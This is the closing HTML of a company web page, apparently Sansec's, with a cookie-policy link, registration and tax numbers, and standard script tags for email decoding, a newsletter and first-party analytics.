Cookie Policy</a><div class="hidden md:inline-block ml-2 mr-2">|</div><div class="block md:hidden ml-2 mr-2 mt-4"></div>Company Reg 77165187<div class="inline-block ml-2 mr-2">|</div>Tax NL860920306B01</h2></div></div></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="/assets/2023/newsletter.js" type="text/javascript" charset="utf-8"></script><script async>(new Image).src="https://api.sansec.io/v1/ping"</script><script async defer="defer" src="/assets/2023/simple.js"></script><noscript><img src="https://simple.sansec.io/noscript.gif" alt="spacer" referrerpolicy="no-referrer-when-downgrade"></noscript></body></html>